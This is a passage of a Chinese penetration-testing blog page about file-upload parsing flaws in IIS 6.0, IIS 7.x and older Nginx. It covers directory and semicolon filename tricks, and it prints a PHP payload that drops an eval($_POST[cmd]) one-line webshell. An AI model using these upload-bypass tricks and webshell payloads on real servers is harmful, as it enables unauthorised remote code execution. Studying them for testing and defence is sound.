+<p>例如创建目录 sp.asp，那么<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sp.asp/1.jpg</span><br></pre></td></tr></table></figure></p>
+<p> 将被当作asp文件来执行。假设黑阔可以控制上传文件夹路径,就可以不管你上传后你的图片改不改名都能拿shell了。</p>
+<p>第二种，在IIS6.0下，分号后面的不被解析，也就是说<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sp.asp;.jpg</span><br></pre></td></tr></table></figure></p>
+<p>会被服务器看成是sp.asp</p>
+<p>还有IIS6.0 默认的可执行文件除了asp还包含这三种<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/sp.asa</span><br><span class="line">/sp.cer</span><br><span class="line">/sp.cdx</span><br></pre></td></tr></table></figure></p>
+<h2 id="IIS-7-0-IIS-7-5-Nginx-lt-8-03畸形解析漏洞"><a href="#IIS-7-0-IIS-7-5-Nginx-lt-8-03畸形解析漏洞" class="headerlink" title="IIS 7.0/IIS 7.5/ Nginx &lt;8.03畸形解析漏洞"></a>IIS 7.0/IIS 7.5/ Nginx &lt;8.03畸形解析漏洞</h2><p>在默认Fast-CGI开启状况下,黑阔上传一个名字为sp.jpg，内容为<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?PHP fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php eval($_POST[cmd])?&gt;'</span>);?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>的文件，然后访问sp.jpg/.php,在这个目录下就会生成一句话木马 shell.php</p>
+<p>或者写一个图片马,直接执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell.jpg/.pgp</span><br></pre></td></tr></table></figure></p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/上传/">上传</a>
+</div>
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+
+  <nav id="page-nav" class="clearfix">
+    <a class="extend prev" rel="prev" href="/page/5/"><span></span>Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/7/">Next<span></span></a>
+  </nav>
+
+</div>
+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
+<aside class="clearfix">
+
+  
+
+
+  
+<div class="category-block">
+  <h3 class="asidetitle">分类</h3>
+     <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/SEO/">SEO</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/SEO/反向代理/">反向代理</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/">代码审计</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/php代码审计/">php代码审计</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/">杂七杂八</a><span class="category-list-count">11</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/hexo/">hexo</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/parrot/">parrot</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/rad-linux/">rad linux</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/windows7/">windows7</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/工具/">工具</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a><span class="category-list-count">38</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/CMS/">CMS</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/XSS/">XSS</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/上传/">上传</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/其他/">其他</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/内网/">内网</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/工具/">工具</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/提取/">提取</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/提权/">提权</a><span class="category-list-count">11</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/注入/">注入</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/端口/">端口</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/笔记/">笔记</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/资源/">资源</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/">编程开发</a><span class="category-list-count">7</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/Python/">Python</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/javascript/">javascript</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/逆向工程/">逆向工程</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/逆向工程/mips/">mips</a><span class="category-list-count">1</span></li></ul></li></ul>
+</div>
+
+
+  
+
+  <div class="linkslist">
+  <p class="asidetitle">友情链接</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="https://coderq.com" target="_blank" title="一个面向程序员交流分享的新一代社区">码农圈</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://dillinger.io" target="_blank" title="在线看makedown编译出的效果">makedown</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://mochazz.github.io" target="_blank" title="一个审计大佬的博客">审计</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.php.cn/course/74.html" target="_blank" title="php官方网站">php</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://blog.51cto.com/simeon" target="_blank" title="一个经常发布资源大佬的博客">资源</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.liaoxuefeng.com" target="_blank" title="学习python的个人博客">python</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.kanxue.com" target="_blank" title="二进制安全学习窝">看雪</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="www.secquan.org" target="_blank" title="常混的论坛">圈子</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.2cto.com" target="_blank" title="各种渗透书籍随便挑">红黑联盟</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.cnblogs.com" target="_blank" title="一个内网大佬的博客">linuxsec</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.runoob.com" target="_blank" title="学习各种编程脚本的好地方">W3C</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.91ri.org" target="_blank" title="内网挺可以">91安全</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.kali.org.cn" target="_blank" title="kali linux">kali linux</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.shiyanlou.com" target="_blank" title="实验楼">实验楼</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+  
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
+</div>
+
+  <div class="weiboshow">
+  <p class="asidetitle">新浪微博</p>
+    <iframe width="100%" height="119" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=&verifier=b3593ceb&dpc=1"></iframe>
+</div>
+
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> Hello ,I&#39;m Bug`小虫 Page in Google. <br/>
+			This is my blog,believe it or not.</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/2176287895" target="_blank" class="icon-weibo" title="微博"></a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2018 
+		
+		<a href="/about" target="_blank" title="小虫">小虫</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?e6d1f421bbc9962127a50488f9ed37d1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  <script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"model":"wanko","bottom":-30,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>
+ </html>
